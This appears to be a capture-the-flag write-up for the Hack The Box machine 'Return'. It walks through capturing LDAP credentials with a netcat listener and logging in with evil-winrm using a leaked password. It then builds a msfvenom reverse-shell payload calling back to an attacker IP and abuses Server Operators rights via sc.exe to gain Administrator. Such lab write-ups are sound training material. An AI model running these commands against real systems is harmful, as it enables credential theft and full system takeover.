---
title: 'HTB - Return'
author: paincakes
date: 2023-02-11 20:55:00 +0800
categories: [HTB, Easy]
tags: [AD, htb-walkthrough]
---


![Box-Info](https://paincakes.sirv.com/Images/HTB/Return/INFO.png)

# Summary
This Machine “Return” specially focuses on exploiting a printer’s configuration which was exposed on the website the server was hosting by which we could exploit it and get the credentials to access the machine. Then we see that were the are part of “Server Operators groups” which we could use for gaining access to the reverse shell with Administrator Privilege. It was an easy and straight forward box.


## NMAP Scanning

Let’s start with scanning the IP with NMAP to enumerate open ports and the services running on the host.

![NMAP](https://paincakes.sirv.com/Images/HTB/Return/nmap.png)

As we can see lots of ports are open, but the main take away is that this is a Windows Machine that is inside an Active Directory domain. If you are not sure, you can always tell by these usual suspects:

- Port 135/139/445 running SMB 
- Port 88 running Kerberos
- Port 389/636 running LDAP

We do have port 80 open which is running a Microsoft IIS Web Server so let’s check that
out first.


## Web Server Enumeration 

![Return](https://paincakes.sirv.com/Images/HTB/Return/Web%20Page.png)

It was a static webpage with only **Home** and **Settings** Page working.
 
![Return](https://paincakes.sirv.com/Images/HTB/Return/Settings.png)

The settings page is likely to be the settings of the Printer in the AD. It gives us the username `svc-printer`, but the password is hidden, looking at the browser console, only the Server Address text input works as the parameter of IP when you press the “Update” button.

We can change the server address to our IP address and listen to port 389 which uses insecure version of LDAP which returns the credentials in plain text when queried. So first checking our IP address and listen to port 389 using netcat.

![Return](https://paincakes.sirv.com/Images/HTB/Return/netcat.png)

Change the “Server Address” to our IP address and press “Update”.

![Return](https://paincakes.sirv.com/Images/HTB/Return/server%20ip.png)

The page will get stuck, and we will get the password of “svc-printer” from the LDAP query in our `netcat` listener.

![Return](https://paincakes.sirv.com/Images/HTB/Return/svc-password.png)

We get the pasword! ezpz

## Enumerating Shares

Accessing the shares using `crackmapexec` tool,

![Return](https://paincakes.sirv.com/Images/HTB/Return/cme%20smb.png)

We had READ/WRITE access on the shares, so maybe we can even access the PS shell using `evil-winrm` tool.

## Getting the $shell and User flag

`evil-winrm -u 'svc-printer' -p '1edFg43012!!' -i 10.10.11.108`

![Return](https://paincakes.sirv.com/Images/HTB/Return/evil-winrm.png)

We can find the user flag in the `C:\Users\svc-printer\Desktop\` directory.

![Return](https://paincakes.sirv.com/Images/HTB/Return/user%20flag.png)

## Privilege Escalation

Executing the command `net user` svc-printer shows us that we are part of the “Server Operators group”. Members of this group can start/stop system services. Server Operators have this capability, and the command gets executed with Administrative privileges, so we can modify the service binary path to obtain reverse shell with admin privilege.

![Return](https://paincakes.sirv.com/Images/HTB/Return/net%20user.png)

### Building Malicious .exe file with MSFvenom

We can use msfvenom to build a “exe” payload which establishes a reverse shell of the remote machine.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4545 -f exe > shell.exe`

![Return](https://paincakes.sirv.com/Images/HTB/Return/msfvenom.png)

From the `evil-winrm` remote connection we can easily upload our payload from its “upload” functionality.

### Getting  ROOT 

Now, Starting the `netcat` listener at port 4545 and running the following commands on the `evil-winrm` shell.

```
sc.exe config vss binPath="C:\Users\svc-printer\Documents\shell.exe”
sc.exe stop vss
sc.exe start vss
```

![Return](https://paincakes.sirv.com/Images/HTB/Return/start%20stop.png)

After executing the start command the terminal will freeze and we will get the reverse shell with Administrator privilege on our `netcat` listener.

![Return](https://paincakes.sirv.com/Images/HTB/Return/root%20shell.png)

The root flag is found in `C:\Users\Administrator\Desktop\` directory.

![Return](https://paincakes.sirv.com/Images/HTB/Return/root%20flag.png)

